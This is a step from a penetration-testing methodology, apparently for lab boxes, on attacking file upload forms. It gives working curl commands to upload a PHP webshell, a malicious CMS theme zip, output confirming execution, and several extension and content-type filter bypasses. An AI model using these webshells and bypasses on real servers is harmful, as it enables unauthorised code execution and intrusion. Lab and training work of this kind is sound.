# Linux - File Upload

**Step 9 of 50 · Linux**

*Identify what a file upload accepts, bypass filters, and land a webshell or payload.*

## Run this

First confirm what the upload accepts — try an innocent `.txt`:

```bash
curl -s -b $BoxDir/cookies.txt \
  -F "file=@/tmp/test.txt" \
  http://$BoxIP/upload.php
```

If accepted, escalate to a PHP webshell:

```bash
# Create a minimal webshell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/cmd.php

# Upload it
curl -s -b $BoxDir/cookies.txt \
  -F "file=@/tmp/cmd.php" \
  http://$BoxIP/upload.php

# Test execution
curl -s "http://$BoxIP/uploads/cmd.php?cmd=id"
```

For CMS theme/plugin zip uploads:

```bash
# Put the webshell inside a directory structure matching the CMS theme format
mkdir -p /tmp/malicious
echo '<?php system($_GET["cmd"]); ?>' > /tmp/malicious/malicious.php
cd /tmp && zip -r malicious.zip malicious/

# Upload via the CMS theme installer, then access at the expected theme path
curl -s "http://$BoxIP/themes/malicious/malicious.php?cmd=id"
```

## Example output

Upload accepted:

```
File uploaded successfully: /uploads/cmd.php
```

Webshell confirmed:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## What did you get?

- [ ] `.php` is accepted and executes → **Confirm with `?cmd=id`, then send a reverse shell and go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] `.php` is blocked by extension → **Try `.php5`, `.phtml`, `.phar`, `.php.jpg`; go to HackTricks File Upload for full bypass list**
- [ ] Content-type filter blocks it → **Change the `Content-Type` header to `image/jpeg` but keep the `.php` extension**
- [ ] File uploads but does not execute → **Find the upload directory and confirm the server interprets PHP there**
- [ ] Zip upload is accepted (CMS plugin/theme) → **Unzip path determines the webshell URL — check CMS documentation for the theme directory**
- [ ] No upload path found → **Go to Step 10 · [[Linux - Exploit Search]]**

## Notes

Find the upload directory in the page source, feroxbuster output, or the upload response. The webshell URL is the upload directory plus the filename.

For reverse shell from the webshell — send via URL-encoded `cmd` parameter or switch to a dedicated reverse shell payload. Get the shell string from RevShells.

## Gotcha

> [!warning] 💡
> Extension filters are often client-side only. Intercept the upload with Burp or replace the Content-Disposition filename after the filter runs. Many filters also only check the last extension — `file.php.jpg` passes a `.jpg` check but the server may still execute it as PHP.

> [!warning] 💡
> CMS theme uploads may need specific directory structures, `style.css` headers, or metadata files to be accepted. Read the CMS documentation or examine a legitimate theme archive first.

## External Resources

| Resource | Link |
|---|---|
| HackTricks — File Upload | https://book.hacktricks.xyz/pentesting-web/file-upload |
| PayloadsAllTheThings — File Upload | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files |
| RevShells | https://www.revshells.com |
